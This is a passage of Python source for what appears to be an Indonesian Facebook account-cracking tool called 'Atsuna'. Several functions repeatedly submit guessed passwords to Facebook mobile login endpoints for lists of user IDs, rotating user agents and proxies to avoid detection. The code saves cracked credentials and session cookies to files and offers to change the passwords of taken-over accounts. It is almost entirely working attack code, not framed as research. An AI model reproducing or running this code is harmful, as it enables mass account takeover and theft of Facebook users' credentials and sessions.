KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(usragent)
	ua = random.choice(ua_crack)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				atsuna = Tree(nel.fit(f"""[b yellow]{idf} | {pw} [b yellow]""",style=f"b blue"),guide_style="bold grey70")
				atsuna.add(nel.fit(f"[b yellow]{ua}[b white]",title="[b red]User-Agents[b white]",style="b blue"))
				cetak(atsuna)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen("play-audio /sdcard/CP.mp3")
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				atsuna = Tree(nel.fit(f"""[b green]{idf} | {pw} [b white]""",style=f"b blue"),guide_style="bold grey70")
				atsuna.add(nel.fit(f"[b green]{kuki}[b white]",title="[b green]Cookies[b white]",style="b blue"))
				cetak(atsuna)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				##os.popen("play-audio /sdcard/ok.mp3")
				#get_apk(active,cookie)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#method 2
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'{bi}Atsuna2{P} [deep_white]{(loop)}/{len(id)}[/] [green]ok[/] : [green]{(ok)} [/][yellow] cp[/] : [yellow]{(cp)}')
	prog.advance(des)
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			ses.headers.update({
'Host': 'm.facebook.com',
'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Linux',
'upgrade-insecure-requests': '1',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'none',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'accept-encoding': 'gzip, deflate',
'accept-language': 'id-ID,id;q=0.9',
})
			link = bs(ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr&nex').text,'html.parser')
			cari = link.find("form",{"method":"post"})
			data = {}
			for queri in cari.find_all('input'):
				if queri.get('name') == None:continue
				data.update({queri.get('name'):queri.get('value')})
			data.update({'pass':pw})
			head = {
'Host': 'm.facebook.com',
'content-length': str(len((";").join([ "%s=%s" % (key, value) for key, value in data.items()]))),
'cache-control': 'max-age=0',
'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': 'Linux',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/device-based/password/?uid=100090441602885&flow=login_no_pin&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9',
}
			po = ses.post('https://m.facebook.com'+cari.get('action'),data=data,headers=head)

			if "checkpoint" in ses.cookies.get_dict().keys():
				
				atsuna = Tree(nel.fit(f"""[b yellow]{idf} | {pw} [b yellow]""",style=f"b blue"),guide_style="bold grey70")
				xyz_atsuna = atsuna.add(nel.fit(f"[b red]Thanks You[b white]",style="b blue"))
				xyz_atsuna.add("ALVINO ADIJAYA")
				xyz_atsuna.add("NUGRAHA")
				xyz_atsuna.add("XENZ")
				xyz_atsuna.add("NDREX-XD")
				xyz_atsuna.add("RAYAND-XD")
				atsuna.add(nel.fit(f"[b yellow]{ua}[b white]",title="[b red]User-Agents[b white]",style="b blue"))
				cetak(atsuna)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				os.popen("play-audio /sdcard/CP.mp3")
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				atsuna = Tree(nel.fit(f"""[b green]{idf} | {pw} [b white]""",style=f"b blue"),guide_style="bold grey70")
				atsuna.add(nel.fit(f"[b green]{ua}[b white]",title="[b green]User-Agents[b white]",style="b blue"))
				atsuna.add(nel.fit(f"[b green]{kuki}[b white]",title="[b green]Cookies[b white]",style="b blue"))
				cetak(atsuna)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				os.popen("play-audio /sdcard/ok.mp3")
				#get_apk(active,cookie)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
url = "m.facebook.com"
def crackasync(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'{bi}Atsuna3{P} [deep_white]{(loop)}/{len(id)}[/] [green]ok[/] : [green]{(ok)} [/][yellow] cp[/] : [yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": url,"sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-ch-ua-platform": '"Android"',"upgrade-insecure-requests": "1","user-agent": "Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://{url}/","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://{url}/login/save-device/?login_source=login")
			data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),"li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),"try_number": "0","unrecognized_tries": "0","email": idf,"prefill_contact_point": f"{idf} {pw}","prefill_source": "browser_dropdown","prefill_type": "password","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": True,"is_smart_lock": False,"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),"bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"encpass": f"#PWD_BROWSER:0:{str(tod()).split('.')[0]}:{pw}","jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)}
			
			head = {"Host": url,"content-length":" 2132","sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","user-agent": ua,"x-response-format": "JSONStream","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"x-requested-with": "XMLHttpRequest","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": f"https://{url}","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": f"https://{url}/","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=head, allow_redirects=True)
			if "checkpoint" in po.cookies.get_dict().keys():
				
				atsuna = Tree(nel.fit(f"""[b yellow]{idf} | {pw} [b yellow]""",style=f"b blue"),guide_style="bold grey70")
				xyz_atsuna = atsuna.add(nel.fit(f"[b red]Thanks You[b white]",style="b blue"))
				xyz_atsuna.add("ALVINO ADIJAYA")
				xyz_atsuna.add("NUGRAHA")
				xyz_atsuna.add("XENZ")
				xyz_atsuna.add("NDREX-XD")
				xyz_atsuna.add("RAYAND-XD")
				atsuna.add(nel.fit(f"[b yellow]{ua}[b white]",title="[b red]User-Agents[b white]",style="b blue"))
				cetak(atsuna)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				os.popen("play-audio /sdcard/CP.mp3")
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				atsuna = Tree(nel.fit(f"""[b green]{idf} | {pw} [b white]""",style=f"b blue"),guide_style="bold grey70")
				atsuna.add(nel.fit(f"[b green]{ua}[b white]",title="[b green]User-Agents[b white]",style="b blue"))
				atsuna.add(nel.fit(f"[b green]{kuki}[b white]",title="[b green]Cookies[b white]",style="b blue"))
				cetak(atsuna)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				os.popen("play-audio /sdcard/ok.mp3")
				#get_apk(active,cookie)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def metode_api(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'{bi}Atsuna4{P} [deep_white]{(loop)}/{len(id)}[/] [green]ok[/] : [green]{(ok)} [/][yellow] cp[/] : [yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}) 
			p = ses.get('https://https://m.facebook.com/login/device-based/login/async/?refsrc?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccount.g2a.com%252Fsocial%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%252Cuser_friends%252Cuser_location%252Cuser_hometown%26client_id%3D1644784435786840%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd637d281-30d5-4793-83cf-2638f569b87f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.g2a.com%2Fsocial%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mobile.facebook.com/v8.0/dialog/oauth?response_type=code&redirect_uri=https%3A%2F%2Faccount.g2a.com%2Fsocial%2Ffacebook%2Fcallback&scope=email%2Cpublic_profile%2Cuser_friends%2Cuser_location%2Cuser_hometown&client_id=1644784435786840&ret=login&fbapp_pres=0&logger_id=d637d281-30d5-4793-83cf-2638f569b87f&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://https://m.facebook.com/login/device-based/login/async/?refsrc?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccount.g2a.com%252Fsocial%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%252Cuser_friends%252Cuser_location%252Cuser_hometown%26client_id%3D1644784435786840%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd637d281-30d5-4793-83cf-2638f569b87f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.g2a.com%2Fsocial%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				
				atsuna = Tree(nel.fit(f"""[b yellow]{idf} | {pw} [b yellow]""",style=f"b blue"),guide_style="bold grey70")
				xyz_atsuna = atsuna.add(nel.fit(f"[b red]Thanks You[b white]",style="b blue"))
				xyz_atsuna.add("ALVINO ADIJAYA")
				xyz_atsuna.add("NUGRAHA")
				xyz_atsuna.add("XENZ")
				xyz_atsuna.add("NDREX-XD")
				xyz_atsuna.add("RAYAND-XD")
				atsuna.add(nel.fit(f"[b yellow]{ua}[b white]",title="[b red]User-Agents[b white]",style="b blue"))
				cetak(atsuna)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				os.popen("play-audio /sdcard/CP.mp3")
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				atsuna = Tree(nel.fit(f"""[b green]{idf} | {pw} [b white]""",style=f"b blue"),guide_style="bold grey70")
				atsuna.add(nel.fit(f"[b green]{ua}[b white]",title="[b green]User-Agents[b white]",style="b blue"))
				atsuna.add(nel.fit(f"[b green]{kuki}[b white]",title="[b green]Cookies[b white]",style="b blue"))
				cetak(atsuna)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				os.popen("play-audio /sdcard/ok.mp3")
				#get_apk(active,cookie)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#___________[Tahun]____________________________#
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	atsu = []
	dirs = os.listdir('CP')
	cetak(flame(f"[[b green]•[b white]] Pilih Hasil Crack Yg Tersimpan Untuk Cek Opsi",style="b blue"))
	#print ("%s%s%s [%s\033[0m \033[0mpilih hasil crack yg tersimpan untuk cek opsi %s{P}]\n"%(U,til,O,U,O)) 
	nomor = 0
	for file in dirs:
		nomor+= 0
		#atsu.append(flame(f"{0}",width=1))
		atsu.append(flame(f"{nomor}",width=10))
		atsu.append(flame(f"{file}",width=40))
		lupine_id.print(Columns(atsu))
		#print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0m Masukan file [ cth%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s \033[0mfile tidak ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s \033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s \033[0misi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s \033[0mnama file %s\033[0m tidak tersedia"%(M,til,romi))
	jalan("%s%s%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(U,til,O))
	pw=input("\n%s%s%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s \033[0mmasukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s sandi minimal 6 karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s%s%s\033[0m total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
